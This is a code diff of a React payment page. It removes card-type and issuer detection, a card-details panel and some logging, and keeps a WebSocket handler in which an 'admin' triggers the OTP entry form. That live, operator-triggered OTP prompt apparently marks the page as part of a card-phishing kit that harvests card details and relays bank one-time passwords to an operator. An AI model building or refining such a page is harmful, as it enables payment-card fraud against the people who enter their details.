@@ -17,28 +17,6 @@ const Payment = () => {
   const [success, setSuccess] = useState(false);
 
   const planData = location.state?.planData;
-  const paymentData = location.state?.paymentData;
-
-  // Function to detect card type
-  const getCardType = (cardNumber: string) => {
-    const num = cardNumber.replace(/\s/g, '');
-    if (num.startsWith('4')) return 'Visa';
-    if (num.startsWith('5') || num.startsWith('2')) return 'Mastercard';
-    if (num.startsWith('3')) return 'American Express';
-    if (num.startsWith('6')) return 'RuPay';
-    return 'Unknown';
-  };
-
-  // Function to get card issuer/bank (simplified)
-  const getCardIssuer = (cardNumber: string) => {
-    const num = cardNumber.replace(/\s/g, '');
-    if (num.startsWith('4111')) return 'HDFC Bank';
-    if (num.startsWith('5555')) return 'ICICI Bank';
-    if (num.startsWith('4000')) return 'SBI Bank';
-    if (num.startsWith('3782')) return 'American Express';
-    if (num.startsWith('6521')) return 'RuPay - SBI';
-    return 'Unknown Bank';
-  };
 
   useEffect(() => {
     if (!planData) {
@@ -50,8 +28,6 @@ const Payment = () => {
     const socketUrl = process.env.NODE_ENV === 'production' 
       ? window.location.origin
       : 'http://localhost:3001';
-    
-    console.log('Connecting to WebSocket server:', socketUrl);
     
     const newSocket = io(socketUrl, {
       timeout: 10000,
@@ -66,14 +42,10 @@ const Payment = () => {
       console.log('Connected to WebSocket server');
     });
 
-    newSocket.on('connect_error', (error) => {
-      console.error('WebSocket connection error:', error);
-    });
-
     newSocket.on('show-otp', () => {
       console.log('Admin requested OTP');
       setShowOtp(true);
-      setIsProcessing(false); // Stop loading when OTP is requested
+      setIsProcessing(false); // Stop loading spinner when OTP form appears
       setError('');
     });
 
@@ -182,20 +154,7 @@ const Payment = () => {
             <div className="text-center py-6">
               <Shield className="h-12 w-12 text-blue-500 mx-auto mb-4" />
               <h3 className="text-lg font-semibold text-gray-800 mb-2">Enter OTP</h3>
-              <p className="text-gray-600 mb-4">Please enter the OTP sent to your registered mobile number</p>
-              
-              {/* Card Details Display */}
-              {paymentData && (
-                <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left">
-                  <h4 className="font-semibold text-gray-700 mb-2">Verification Details</h4>
-                  <div className="text-sm text-gray-600 space-y-1">
-                    <div>Card Type: <span className="font-medium text-blue-600">{getCardType(paymentData.cardNumber)}</span></div>
-                    <div>Issuer: <span className="font-medium text-blue-600">{getCardIssuer(paymentData.cardNumber)}</span></div>
-                    <div>Card: <span className="font-medium">**** **** **** {paymentData.cardNumber.slice(-4)}</span></div>
-                    <div>Name: <span className="font-medium">{paymentData.cardName}</span></div>
-                  </div>
-                </div>
-              )}
+              <p className="text-gray-600 mb-6">Please enter the OTP sent to your registered mobile number</p>
               
               <div className="flex justify-center mb-6">
                 <InputOTP
@@ -224,7 +183,7 @@ const Payment = () => {
             </div>
           )}
 
-          {/* Processing State - Only show when NOT showing OTP */}
+          {/* Processing State */}
           {isProcessing && !showOtp && !success && !error && (
             <div className="text-center py-8">
               <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
